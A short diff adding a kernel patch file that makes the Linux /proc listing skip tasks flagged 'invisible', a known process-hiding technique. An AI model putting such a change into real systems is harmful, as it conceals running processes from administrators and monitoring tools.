@@ -1,0 +1,13 @@
+--- base.c.orig	2009-11-25 05:11:11.000000000 +0200
++++ base.c	2009-11-25 05:13:46.000000000 +0200
+@@ -2754,6 +2754,10 @@
+ 	for (iter = next_tgid(ns, iter);
+ 	     iter.task;
+ 	     iter.tgid += 1, iter = next_tgid(ns, iter)) {
++		
++		// skip invisible tasks
++		if(iter.task->invisible == 1) continue;
++
+ 		filp->f_pos = iter.tgid + TGID_OFFSET;
+ 		if (proc_pid_fill_cache(filp, dirent, filldir, iter) < 0) {
+ 			put_task_struct(iter.task);
